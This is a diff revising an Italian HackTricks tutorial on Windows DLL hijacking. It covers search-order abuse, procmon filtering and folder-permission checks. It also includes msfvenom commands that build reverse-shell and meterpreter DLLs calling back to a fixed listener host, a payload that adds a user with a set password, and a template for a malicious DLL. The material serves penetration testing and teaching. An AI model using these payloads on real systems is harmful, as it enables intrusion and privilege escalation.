@@ -1,4 +1,4 @@
-# Dll Hijacking
+# DLL Hijacking
 
 <details>
 
@@ -8,47 +8,47 @@ Altri modi per supportare HackTricks:
 
 * Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusivi [**NFT**](https://opensea.io/collection/the-peass-family)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusivi [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.
 
 </details>
 
 <figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Suggerimento per bug bounty**: **iscriviti** a **Intigriti**, una piattaforma premium per **bug bounty creata da hacker, per hacker**! Unisciti a noi su [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) oggi e inizia a guadagnare taglie fino a **$100,000**!
+**Suggerimento per bug bounty**: **iscriviti** a **Intigriti**, una piattaforma premium di **bug bounty creata da hacker, per hacker**! Unisciti a noi su [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) oggi e inizia a guadagnare taglie fino a **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
 ## Informazioni di Base
 
-Il DLL Hijacking coinvolge la manipolazione di un'applicazione fidata per caricare un DLL dannoso. Questo termine include diverse tattiche come **DLL Spoofing, Injection e Side-Loading**. Viene principalmente utilizzato per l'esecuzione del codice, per ottenere persistenza e, meno comunemente, per l'escalation dei privilegi. Nonostante il focus sull'escalation qui, il metodo di dirottamento rimane coerente tra gli obiettivi.
+Il DLL Hijacking coinvolge la manipolazione di un'applicazione attendibile per caricare un DLL dannoso. Questo termine comprende diverse tattiche come **DLL Spoofing, Injection e Side-Loading**. Viene principalmente utilizzato per l'esecuzione del codice, il raggiungimento della persistenza e, meno comunemente, l'escalation dei privilegi. Nonostante il focus sull'escalation qui, il metodo di dirottamento rimane coerente tra gli obiettivi.
 
 ### Tecniche Comuni
 
-Sono utilizzati diversi metodi per il DLL hijacking, ognuno con la propria efficacia a seconda della strategia di caricamento dei DLL dell'applicazione:
+Sono impiegate diverse metodologie per il DLL hijacking, ognuna con la sua efficacia a seconda della strategia di caricamento dei DLL dell'applicazione:
 
 1. **Sostituzione del DLL**: Sostituire un DLL genuino con uno dannoso, facoltativamente utilizzando il DLL Proxying per preservare la funzionalità del DLL originale.
 2. **DLL Search Order Hijacking**: Posizionare il DLL dannoso in un percorso di ricerca prima di quello legittimo, sfruttando il modello di ricerca dell'applicazione.
-3. **Phantom DLL Hijacking**: Creare un DLL dannoso per farlo caricare da un'applicazione, pensando che sia un DLL richiesto inesistente.
+3. **Phantom DLL Hijacking**: Creare un DLL dannoso per un'applicazione da caricare, pensando che sia un DLL richiesto inesistente.
 4. **Redirezione del DLL**: Modificare i parametri di ricerca come `%PATH%` o i file `.exe.manifest` / `.exe.local` per indirizzare l'applicazione al DLL dannoso.
 5. **Sostituzione del DLL WinSxS**: Sostituire il DLL legittimo con un corrispettivo dannoso nella directory WinSxS, un metodo spesso associato al side-loading dei DLL.
-6. **DLL Hijacking del percorso relativo**: Posizionare il DLL dannoso in una directory controllata dall'utente con l'applicazione copiata, simile alle tecniche di esecuzione di proxy binario.
+6. **DLL Hijacking del percorso relativo**: Posizionare il DLL dannoso in una directory controllata dall'utente con l'applicazione copiata, somigliante alle tecniche di esecuzione di Binary Proxy.
 
 ## Trovare Dll mancanti
 
 Il modo più comune per trovare Dll mancanti all'interno di un sistema è eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) da sysinternals, **impostando** i **seguenti 2 filtri**:
 
-![](<../../../.gitbook/assets/image (311).png>)
+![](<../../../.gitbook/assets/image (961).png>)
 
-![](<../../../.gitbook/assets/image (313).png>)
+![](<../../../.gitbook/assets/image (230).png>)
 
-e mostrare solo l'**Attività del file system**:
+e mostrare solo l'**Attività del File System**:
 
-![](<../../../.gitbook/assets/image (314).png>)
+![](<../../../.gitbook/assets/image (153).png>)
 
 Se stai cercando **dll mancanti in generale** lascia questo in esecuzione per alcuni **secondi**.\
-Se stai cercando un **dll mancante all'interno di un eseguibile specifico** dovresti impostare **un altro filtro come "Nome del processo" "contiene" "\<nome eseguibile>", eseguirlo e interrompere la cattura degli eventi**.
+Se stai cercando un **dll mancante all'interno di un eseguibile specifico** dovresti impostare **un altro filtro come "Nome del Processo" "contiene" "\<nome eseguibile>", eseguirlo e interrompere la cattura degli eventi**.
 
 ## Sfruttare i Dll mancanti
 
@@ -64,58 +64,51 @@ Puoi vedere l'**ordine di ricerca dei DLL sui sistemi a 32 bit** di seguito:
 
 1. La directory da cui è stata caricata l'applicazione.
 2. La directory di sistema. Utilizza la funzione [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) per ottenere il percorso di questa directory.(_C:\Windows\System32_)
-3. La directory di sistema a 16 bit. Non esiste una funzione che ottiene il percorso di questa directory, ma viene cercata. (_C:\Windows\System_)
+3. La directory di sistema a 16 bit. Non esiste una funzione che ottiene il percorso di questa directory, ma viene comunque cercata. (_C:\Windows\System_)
 4. La directory di Windows. Utilizza la funzione [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) per ottenere il percorso di questa directory.
-5. (_C:\Windows_)
-6. La directory corrente.
-7. Le directory elencate nella variabile di ambiente PATH. Nota che questo non include il percorso per applicazione specificato dalla chiave di registro **App Paths**. La chiave **App Paths** non viene utilizzata nel calcolo del percorso di ricerca dei DLL.
+1. (_C:\Windows_)
+5. La directory corrente.
+6. Le directory elencate nella variabile di ambiente PATH. Nota che questo non include il percorso per applicazione specifico specificato dalla chiave di registro **App Paths**. La chiave **App Paths** non viene utilizzata nel calcolo del percorso di ricerca dei DLL.
 
-Questo è l'**ordine di ricerca predefinito con SafeDllSearchMode abilitato**. Quando è disabilitato, la directory corrente scala al secondo posto. Per disabilitare questa funzionalità, crea il valore del registro **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo su 0 (predefinito è abilitato).
+Questo è l'**ordine di ricerca predefinito** con **SafeDllSearchMode** abilitato. Quando è disabilitato, la directory corrente scala al secondo posto. Per disabilitare questa funzionalità, crea il valore di registro **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo su 0 (predefinito è abilitato).
 
 Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.
 
 Infine, nota che **un dll potrebbe essere caricato indicando il percorso assoluto invece del solo nome**. In quel caso quel dll verrà **cercato solo in quel percorso** (se il dll ha delle dipendenze, verranno cercate come appena caricate per nome).
 
 Ci sono altri modi per alterare l'ordine di ricerca ma non li spiegherò qui.
-
 #### Eccezioni sull'ordine di ricerca delle DLL dalla documentazione di Windows
 
 Alcune eccezioni all'ordine di ricerca standard delle DLL sono note nella documentazione di Windows:
 
 * Quando viene incontrata una **DLL che condivide il suo nome con una già caricata in memoria**, il sistema salta la ricerca usuale. Invece, effettua un controllo per il reindirizzamento e un manifesto prima di utilizzare la DLL già in memoria. **In questo scenario, il sistema non effettua una ricerca per la DLL**.
-* Nei casi in cui la DLL è riconosciuta come una **DLL conosciuta** per la versione corrente di Windows, il sistema utilizzerà la sua versione della DLL conosciuta, insieme a tutte le sue DLL dipendenti, **evitando il processo di ricerca**. La chiave di registro **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene un elenco di queste DLL conosciute.
-* Se una **DLL ha delle dipendenze**, la ricerca di queste DLL dipendenti viene effettuata come se fossero indicate solo dai loro **nomi di modulo**, indipendentemente dal fatto che la DLL iniziale sia stata identificata tramite un percorso completo.
+* Nei casi in cui la DLL è riconosciuta come una **DLL conosciuta** per la versione corrente di Windows, il sistema utilizzerà la sua versione della DLL conosciuta, insieme a tutte le sue DLL dipendenti, **saltando il processo di ricerca**. La chiave del registro **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene un elenco di queste DLL conosciute.
+* Se una **DLL ha delle dipendenze**, la ricerca di queste DLL dipendenti viene effettuata come se fossero indicate solo dai **nomi dei moduli**, indipendentemente dal fatto che la DLL iniziale sia stata identificata tramite un percorso completo.
 
 ### Escalation dei privilegi
 
 **Requisiti**:
 
 * Identificare un processo che opera o opererà con **privilegi diversi** (movimento orizzontale o laterale), che **manca di una DLL**.
-* Assicurarsi che sia disponibile l'**accesso in scrittura** per qualsiasi **directory** in cui verrà **ricercata la DLL**. Questa posizione potrebbe essere la directory dell'eseguibile o una directory all'interno del percorso di sistema.
+* Assicurarsi che sia disponibile l'**accesso in scrittura** per qualsiasi **directory** in cui verrà **ricercata la DLL**. Questa posizione potrebbe essere la directory dell'eseguibile o una directory nel percorso di sistema.
 
-Sì, i requisiti sono complicati da trovare poiché **per impostazione predefinita è strano trovare un eseguibile privilegiato che manca di una DLL** ed è ancora **più strano avere le autorizzazioni in scrittura su una cartella del percorso di sistema** (di default non è possibile). Tuttavia, in ambienti mal configurati ciò è possibile.\
-Nel caso in cui siate fortunati e vi troviate a soddisfare i requisiti, potreste controllare il progetto [UACME](https://github.com/hfiref0x/UACME). Anche se **l'obiettivo principale del progetto è bypassare UAC**, potreste trovare lì un **PoC** di un dirottamento di DLL per la versione di Windows che potete utilizzare (probabilmente cambiando solo il percorso della cartella in cui avete le autorizzazioni in scrittura).
+Sì, i requisiti sono complicati da trovare poiché **di default è strano trovare un eseguibile privilegiato che manca di una DLL** ed è ancora **più strano avere le autorizzazioni in scrittura su una cartella del percorso di sistema** (di default non è possibile). Tuttavia, in ambienti mal configurati ciò è possibile.\
+Nel caso in cui tu sia fortunato e ti trovi a soddisfare i requisiti, potresti controllare il progetto [UACME](https://github.com/hfiref0x/UACME). Anche se l'**obiettivo principale del progetto è bypassare UAC**, potresti trovare lì un **PoC** di un dirottamento di DLL per la versione di Windows che stai utilizzando (probabilmente cambiando solo il percorso della cartella in cui hai le autorizzazioni in scrittura).
 
-Nota che è possibile **verificare le proprie autorizzazioni in una cartella** eseguendo:
-
+Nota che puoi **verificare le tue autorizzazioni in una cartella** eseguendo:
 ```bash
 accesschk.exe -dqv "C:\Python27"
 icacls "C:\Python27"
 ```
-
 E **controllare le autorizzazioni di tutte le cartelle all'interno del PERCORSO**:
-
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
-
 Puoi anche controllare gli import di un eseguibile e le esportazioni di una dll con:
-
 ```c
 dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
 ```
-
 Per una guida completa su come **abusare del Dll Hijacking per escalare i privilegi** con autorizzazioni per scrivere in una cartella **System Path**, controlla:
 
 {% content-ref url="writable-sys-path-+dll-hijacking-privesc.md" %}
@@ -129,41 +122,34 @@ Altri strumenti automatizzati interessanti per scoprire questa vulnerabilità so
 
 ### Esempio
 
-Nel caso in cui trovi uno scenario sfruttabile, una delle cose più importanti per sfruttarlo con successo sarebbe **creare un dll che esporti almeno tutte le funzioni che l'eseguibile importerà da esso**. Comunque, nota che il Dll Hijacking è utile per [scalare dal livello di integrità Medio a Alto **(bypassando UAC)**](../../authentication-credentials-uac-and-efs/#uac) o da [**Alto a SYSTEM**](../#from-high-integrity-to-system)**.** Puoi trovare un esempio su **come creare un dll valido** all'interno di questo studio sul dll hijacking focalizzato sull'esecuzione del dll: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
+Nel caso in cui trovi uno scenario sfruttabile, una delle cose più importanti per sfruttarlo con successo sarebbe **creare un dll che esporti almeno tutte le funzioni che l'eseguibile importerà da esso**. Comunque, nota che il Dll Hijacking è utile per [scalare dal livello di integrità Medio a Alto **(bypassando UAC)**](../../authentication-credentials-uac-and-efs/#uac) o da [**Alto a SISTEMA**](../#from-high-integrity-to-system)**.** Puoi trovare un esempio su **come creare un dll valido** all'interno di questo studio sul dll hijacking focalizzato sull'esecuzione: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
 Inoltre, nella **sezione successiva** puoi trovare alcuni **codici dll di base** che potrebbero essere utili come **modelli** o per creare un **dll con funzioni non richieste esportate**.
 
-## **Creazione e compilazione di Dlls**
+## **Creazione e compilazione dei Dll**
 
 ### **Dll Proxifying**
 
-Fondamentalmente un **proxy Dll** è un Dll in grado di **eseguire il tuo codice dannoso quando caricato** ma anche di **esporre** e **funzionare** come **previsto** inoltrando tutte le chiamate alla libreria reale.
+Fondamentalmente un **proxy Dll** è un Dll in grado di **eseguire il tuo codice dannoso quando caricato** ma anche di **esporre** e **funzionare** come **previsto** **trasmettendo tutte le chiamate alla libreria reale**.
 
 Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi effettivamente **indicare un eseguibile e selezionare la libreria** che desideri proxificare e **generare un dll proxified** o **indicare il Dll** e **generare un dll proxified**.
 
 ### **Meterpreter**
 
 **Ottieni shell reversa (x64):**
-
 ```bash
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-
 **Ottieni un meterpreter (x86):**
-
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-
-**Creare un utente (x86 non ho visto una versione x64):**
-
+**Creare un utente (non ho visto una versione x64):**
 ```
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
-
 ### Il tuo
 
 Nota che in diversi casi la Dll che compili deve **esportare diverse funzioni** che verranno caricate dal processo vittima, se queste funzioni non esistono il **binario non sarà in grado di caricarle** e lo **sfruttamento fallirà**.
-
 ```c
 // Tested in Win10
 // i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
@@ -244,7 +230,6 @@ break;
 return TRUE;
 }
 ```
-
 ## Riferimenti
 
 * [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
@@ -252,7 +237,7 @@ return TRUE;
 
 <figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Suggerimento per la caccia al bug**: **iscriviti** a **Intigriti**, una piattaforma premium per la **caccia ai bug creata da hacker, per hacker**! Unisciti a noi su [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) oggi stesso e inizia a guadagnare taglie fino a **$100,000**!
+**Suggerimento per la ricompensa dei bug**: **iscriviti** a **Intigriti**, una piattaforma premium per i **bug bounty creata da hacker, per hacker**! Unisciti a noi su [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) oggi stesso e inizia a guadagnare ricompense fino a **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
@@ -262,7 +247,7 @@ return TRUE;
 
 Altri modi per supportare HackTricks:
 
-* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
 * Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
